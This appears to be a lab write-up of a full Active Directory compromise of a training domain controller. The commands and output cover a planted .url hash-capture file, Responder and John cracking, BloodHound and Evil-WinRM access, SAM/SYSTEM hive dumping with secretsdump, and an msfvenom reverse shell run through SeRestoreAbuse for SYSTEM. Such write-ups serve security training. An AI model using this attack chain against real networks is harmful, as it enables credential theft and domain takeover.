# SUMMARY
The penetration test successfully compromised the target Windows Active Directory domain. Initial reconnaissance identified a Domain Controller with an anonymously accessible SMB share. A malicious shortcut file was uploaded to this share, which, when accessed by a domain user, triggered an authentication attempt and allowed the capture of an NTLMv2 hash. This hash for the user 'anirudh' was cracked, providing valid domain credentials. Using these credentials, Active Directory enumeration via BloodHound revealed the user had excessive permissions over other objects. The established WinRM session allowed the exploitation of the user's SeRestorePrivilege to replace a system binary with a reverse shell payload. This resulted in the execution of the payload with SYSTEM privileges, granting complete control of the Domain Controller. The final system flag was captured, demonstrating a full chain from anonymous access to domain administrator compromise.
## NMAP

The command performed a comprehensive port scan of the target host at 192.168.212.172. It used TCP SYN scanning to enumerate all 65535 ports, reporting only those in an open state. The scan incorporated version detection to identify service and application details, default NSE scripts to gather further intelligence, and OS fingerprinting. The -Pn flag treated the host as online, bypassing initial ping probes. This scan provides a foundational map of all accessible network services and their versions, critical for subsequent vulnerability analysis and exploitation.

```bash
sudo nmap -sC -sV -Pn -O -p 1-65535 192.168.212.172 --open 
```

The Nmap service enumeration of the target host at 192.168.212.172 has conclusively identified it as a Windows Domain Controller for the domain "vault.offsec". Critical services for Active Directory operation are present, including LDAP, Kerberos, DNS, and Global Catalog services. The presence of SMB on port 445 and WinRM on port 5985 indicates potential avenues for remote access and lateral movement. The RDP service on port 3389 provides the hostname "DC.vault.offsec" and the operating system version Windows Server 2019 via the NTLM information. This host is the primary authority for the domain and represents a high-value target.

```bash
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-13 23:16:04Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-12-13T23:17:38+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC.vault.offsec
| Not valid before: 2025-11-13T13:03:26
|_Not valid after:  2026-05-15T13:03:26
| rdp-ntlm-info: 
|   Target_Name: VAULT
|   NetBIOS_Domain_Name: VAULT
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: vault.offsec
|   DNS_Computer_Name: DC.vault.offsec
|   DNS_Tree_Name: vault.offsec
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-13T23:16:57+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49706/tcp open  msrpc         Microsoft Windows RPC
49859/tcp open  msrpc         Microsoft Windows RPC
```

The NetExec scan against the SMB service on 192.168.212.172 confirmed the host's identity as the Domain Controller "DC" for the domain "vault.offsec". It verified the operating system as Windows Server 2019 Build 17763 with SMB signing enabled, which inhibits certain relay attacks, and confirmed that SMBv1 is disabled, mitigating associated legacy vulnerabilities. This establishes the target's configuration and sets the stage for credentialed enumeration or brute-force attacks against the domain.

```bash
nxc smb 192.168.212.172                                                               
SMB         192.168.212.172 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False) 
```

The local hosts file was modified to add entries for the target IP address 192.168.212.172, resolving it to both the Fully Qualified Domain Name "DC.vault.offsec" and the domain "vault.offsec". This ensures proper name resolution for domain-joined services and Kerberos authentication during subsequent testing, preventing failures due to DNS misconfiguration and enabling tools to interact with the host using its correct domain identity.

```bash
cat /etc/hosts
192.168.212.172 DC.vault.offsec vault.offsec 
```

Anonymous authentication to the SMB service on the Domain Controller was successful. Share enumeration revealed a non-standard share named "DocumentsShare" with READ and WRITE permissions for the anonymous user. This represents a critical misconfiguration, allowing unauthenticated users to read from and write to a file share on a Domain Controller, which constitutes a severe information disclosure and potential initial access vector. The default administrative shares ADMIN$ and C$ were not accessible anonymously.

```bash
nxc smb 192.168.212.172  -u 'anonymous' -p '' --shares
SMB         192.168.212.172 445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:vault.offsec) (signing:True) (SMBv1:False) 
SMB         192.168.212.172 445    DC               [+] vault.offsec\anonymous: (Guest)
SMB         192.168.212.172 445    DC               [*] Enumerated shares
SMB         192.168.212.172 445    DC               Share           Permissions     Remark
SMB         192.168.212.172 445    DC               -----           -----------     ------
SMB         192.168.212.172 445    DC               ADMIN$                          Remote Admin
SMB         192.168.212.172 445    DC               C$                              Default share
SMB         192.168.212.172 445    DC               DocumentsShare  READ,WRITE      
SMB         192.168.212.172 445    DC               IPC$            READ            Remote IPC
SMB         192.168.212.172 445    DC               NETLOGON                        Logon server share 
SMB         192.168.212.172 445    DC               SYSVOL                          Logon server share 
```

A crafted .URL file was created with its IconFile parameter set to a UNC path pointing to the attacker-controlled IP 192.168.45.172. When this file is accessed by a user, it will force the victim system to attempt to authenticate to the specified SMB share. This technique is used to capture or relay incoming NTLM authentication hashes from the target user or machine.

```bash
 cat evil.url                    
[InternetShortcut]
URL=Random_nonsense
WorkingDirectory=Flibertygibbit
IconFile=\\192.168.45.172\%USERNAME%.icon
IconIndex=1
```

The "evil.url" file was successfully uploaded to the anonymously writable "DocumentsShare" SMB share on the Domain Controller using a null session. The file was uploaded multiple times. This action places the malicious shortcut file within a network location accessible to domain users, setting the stage for an NTLM hash capture or relay attack if a user browses the share and the shortcut is rendered.

```bash
smbclient -N //DC.vault.offsec/DocumentsShare 
Try "help" to get a list of possible commands.
smb: \> put evil.url
putting file evil.url as \evil.url (6.1 kb/s) (average 6.1 kb/s)
smb: \> put evil.url
putting file evil.url as \evil.url (5.8 kb/s) (average 6.0 kb/s)
smb: \> put evil.url
putting file evil.url as \evil.url (5.1 kb/s) (average 5.6 kb/s)
smb: \> exit
```

The Responder tool captured an NTLMv2 hash for the user "anirudh" in the "VAULT" domain. The authentication attempt originated from the Domain Controller's IP address (192.168.212.172) and was directed to the attacker's SMB service, triggered by the planted "evil.url" file. This successful capture confirms that a domain user accessed the malicious shortcut, providing a credential hash that can be attempted for offline cracking to obtain the user's plaintext password.

```bash
sudo responder -I tun0 -wF -v  

[SMB] NTLMv2-SSP Client   : 192.168.212.172
[SMB] NTLMv2-SSP Username : VAULT\anirudh
[SMB] NTLMv2-SSP Hash     : anirudh::VAULT:960a6d4f685c74e9:E96F2E1327EBBF34290DF9EB916F9952:0101000000000000807DAE0D8D6CDC01AC2FFAA50E1F664B00000000020008003000480035004D0001001E00570049004E002D004600390057003800550057004600500047004B00580004003400570049004E002D004600390057003800550057004600500047004B0058002E003000480035004D002E004C004F00430041004C00030014003000480035004D002E004C004F00430041004C00050014003000480035004D002E004C004F00430041004C0007000800807DAE0D8D6CDC01060004000200000008003000300000000000000001000000002000000BE3F69B91F1AF51F2BEE6D66F69928BEEBDFF8255EB1ECC647CF9477CF6CEAD0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370032000000000000000000  

```

The captured NTLMv2 hash for the user "anirudh" was successfully cracked using John the Ripper with the rockyou.txt wordlist. The user's password was recovered as "SecureHM". This provides valid domain credentials, escalating access from an anonymous user to an authenticated domain user account.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 5 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
SecureHM         (anirudh)     
1g 0:00:00:06 DONE (2025-12-14 00:10) 0.1488g/s 1579Kp/s 1579Kc/s 1579KC/s Seifer@14..Scarlet27
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Valid credentials for the user "anirudh" were used to authenticate to the Domain Controller via the BloodHound Python ingestor. A comprehensive enumeration of the Active Directory domain "vault.offsec" was performed, collecting data on users, groups, computers, trust relationships, and access control lists. The collected data was compressed for later analysis in the BloodHound GUI to identify attack paths, privilege escalation vectors, and misconfigurations within the domain.

```bash
bloodhound-python -u "anirudh" -p 'SecureHM' -d vault.offsec -c all --zip -ns 192.168.212.172 

INFO: Compressing output into 20251214001351_bloodhound.zip
```
The bloodhound-cli tool was executed with the "up" command. This action uploaded the previously collected Active Directory data from the BloodHound Python ingestor into a running instance of the BloodHound Neo4j database. This prepares the data for graphical analysis and pathfinding within the BloodHound application interface.

```bash
./bloodhound-cli up
```

The BloodHound analysis identified that the compromised user "ANIRUDH@VAULT.OFFSEC" possesses the "GenericWrite" and "WriteOwner" permissions over another principal, such as a user or group. These are powerful Active Directory permissions. "GenericWrite" allows modification of the target object's attributes, while "WriteOwner" allows the attacker to change the object's owner to themselves. This privilege can be leveraged for targeted attribute modification, such as setting a script path on a user, or directly for privilege escalation by taking ownership of a high-privileged account or group.

![BloodHound Analysis](images/vault.png)

A successful remote connection was established to the target Domain Controller using Evil-WinRM. The connection authenticated with the credentials for the user "anirudh" and the cracked password "SecureHM". The hash displayed in the output is the NTLM hash of the user's password, confirming authentication. This provides an interactive command-line shell on the target system with the privileges of the "anirudh" user account.

```bash
evil-winrm -i 192.168.212.172  -u anirudh -p SecureHM  

db77f5b2cd48df278051cb05233e2082

```

The whoami /priv command was executed to enumerate the privileges assigned to the current user context "anirudh". The user holds several significant privileges, most notably SeBackupPrivilege and SeRestorePrivilege. These privileges can be abused to read and write any file on the system, including sensitive domain files like the NTDS.dit database, by leveraging tools such as diskshadow and robocopy. This represents a clear path to Domain Administrator compromise.

```bash
*Evil-WinRM* PS C:\Users\anirudh\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                         State
============================= =================================== =======
SeMachineAccountPrivilege     Add workstations to domain          Enabled
SeSystemtimePrivilege         Change the system time              Enabled
SeBackupPrivilege             Back up files and directories       Enabled
SeRestorePrivilege            Restore files and directories       Enabled
SeShutdownPrivilege           Shut down the system                Enabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
SeTimeZonePrivilege           Change the time zone                Enabled

```

The Windows Registry hives for SAM and SYSTEM were successfully dumped to the files sam.hive and system.hive using the reg save command. These files contain local user account password hashes and the system boot key required to decrypt them. This action was possible due to the user's privileges and provides offline material for credential extraction, though the primary target on a Domain Controller is the NTDS.dit database for domain account hashes.

```bash
*Evil-WinRM* PS C:\temp> reg save hklm\sam C:\users\anirudh\sam.hive
The operation completed successfully.

*Evil-WinRM* PS C:\temp> reg save hklm\system C:\users\anirudh\system.hive
The operation completed successfully.
```

The dumped SAM and SYSTEM hive files were successfully downloaded from the target Domain Controller to the attacker's local machine via the Evil-WinRM session. These files are now available for offline processing to extract password hashes for local accounts stored on the Domain Controller.

```bash
*Evil-WinRM* PS C:\users\anirudh> download sam.hive
                                        
Info: Downloading C:\users\anirudh\sam.hive to sam.hive
                                        
Info: Download successful!
*Evil-WinRM* PS C:\users\anirudh> download system.hive
                                        
Info: Downloading C:\users\anirudh\system.hive to system.hive
                                        
Info: Download successful!

```

The Impacket secretsdump tool was executed against the downloaded SAM and SYSTEM hives. The tool successfully extracted the NTLM hash for the local Administrator account: 608339ddc8f434ac21945e026887dc36. This is the same as the Domain Administrator hash for this Domain Controller, as the local Administrator account is the domain administrator. This hash can now be used for Pass-the-Hash attacks to achieve full domain compromise.

```bash
 secretsdump.py -sam ./sam.hive -system ./system.hive  local                         
Impacket v0.13.0.dev0+20250528.4535.5b338613 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xe9a15188a6ad2d20d26fe2bc984b369e
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:608339ddc8f434ac21945e026887dc36:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```

A Windows x64 reverse TCP shell payload was generated using msfvenom. The payload is configured to connect back to the attacker's IP address 192.168.45.172 on port 80. The payload was output as an executable file named reverse.exe. This malicious executable will be used to establish a reverse shell connection from the target machine back to the attacker's listener.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.172  LPORT=80 -f exe -o reverse.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse.exe
```

A new Evil-WinRM session was initiated to the target Domain Controller at 192.168.212.172 using the credentials for the user "anirudh". This re-established command-line access to the target, likely to proceed with uploading the generated reverse shell payload or to execute post-exploitation commands within the authenticated session.

```bash
evil-winrm -i 192.168.212.172  -u anirudh -p SecureHM 
```

The tool "SeRestoreAbuse.exe" and the "reverse.exe" payload were uploaded to the target. The SeRestoreAbuse utility was then executed, targeting the uploaded reverse shell executable. This action leverages the user's SeRestorePrivilege to overwrite a protected system binary, such as utilman.exe or sethc.exe, with the reverse shell payload. This establishes persistence and privilege escalation, as the replaced binary will execute with SYSTEM privileges when triggered at the login screen.

```bash
Evil-WinRM* PS C:\Users\anirudh\Documents> upload SeRestoreAbuse.exe 
                                        
Info: Uploading /home/kali/Downloads/Vault/SeRestoreAbuse.exe to C:\Users\anirudh\Documents\SeRestoreAbuse.exe
                                        
Data: 22528 bytes of 22528 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\anirudh\Documents> upload reverse.exe
                                        
Info: Uploading /home/kali/Downloads/Vault/reverse.exe to C:\Users\anirudh\Documents\reverse.exe
                                        
Data: 9556 bytes of 9556 bytes copied

*Evil-WinRM* PS C:\Users\anirudh\Documents> .\SeRestoreAbuse.exe C:\Users\anirudh\Documents\reverse.exe

```

A reverse shell connection as the SYSTEM user was received on the attacker's listener. The shell provides full administrative control of the Domain Controller. The final proof of compromise, the contents of the "proof.txt" file, was retrieved and contains the flag 9dcb65d35ea1f115f04004123f7bda8a, confirming successful domain takeover.

```bash
sudo rlwrap nc -nvlp 80
listening on [any] 80 ...
connect to [192.168.45.172] from (UNKNOWN) [192.168.212.172] 52353
Microsoft Windows [Version 10.0.17763.2300]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
9dcb65d35ea1f115f04004123f7bda8a
```


